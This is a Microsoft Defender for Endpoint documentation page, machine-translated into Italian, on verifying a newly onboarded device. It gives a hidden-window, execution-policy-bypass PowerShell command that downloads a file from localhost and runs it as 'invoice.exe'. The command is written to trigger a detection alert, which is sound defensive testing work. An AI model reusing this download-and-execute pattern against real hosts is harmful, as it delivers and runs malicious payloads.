---
title: Eseguire un test di rilevamento su un dispositivo Microsoft Defender ATP appena onboarded
description: Esegui lo script di rilevamento su un dispositivo appena onboarded per verificare che sia stato correttamente onboarded nel servizio Microsoft Defender ATP.
keywords: test di rilevamento, rilevamento, powershell, script, verificare, onboarding, microsoft defender per l'onboarding degli endpoint, client, server, test
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 10154a734bb4c3d8b26fffb8618484aeb11f907a
ms.sourcegitcommit: 956176ed7c8b8427fdc655abcd1709d86da9447e
ms.translationtype: MT
ms.contentlocale: it-IT
ms.lasthandoff: 03/23/2021
ms.locfileid: "51066093"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>Eseguire un test di rilevamento in un dispositivo Microsoft Defender for Endpoint appena onboarded 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**Si applica a:**
- Versioni supportate di Windows 10
- Windows Server 2012 R2
- Windows Server 2016
- Windows Server, versione 1803
- Windows Server, 2019
- [Microsoft Defender ATP](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> Vuoi provare Microsoft Defender per Endpoint? [Iscriversi per una versione di valutazione gratuita.](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

Eseguire lo script di PowerShell seguente in un dispositivo appena onboarded per verificare che sia correttamente segnalato al servizio Defender for Endpoint.

1. Creare una cartella: 'C:\test-MDATP-test'.
2. Apri un prompt della riga di comando con privilegi elevati nel dispositivo ed esegui lo script:

   1. Passare a **Start** e digitare **cmd**.

   1. Fare clic con il **pulsante destro del mouse** su Prompt dei comandi e scegliere Esegui come **amministratore.**

      ![Menu Start finestra che punta a Esegui come amministratore](images/run-as-admin.png)

3. Al prompt dei comandi copiare ed eseguire il comando seguente:

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

La finestra del prompt dei comandi verrà chiusa automaticamente. Se ha esito positivo, il test di rilevamento verrà contrassegnato come completato e un nuovo avviso verrà visualizzato nel portale per il dispositivo onboarded in circa 10 minuti.

## <a name="related-topics"></a>Argomenti correlati
- [Onboard di dispositivi Windows 10](configure-endpoints.md)
- [Server di onboard](configure-server-endpoints.md)
- [Risolvere i problemi di onboarding di Microsoft Defender per endpoint](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
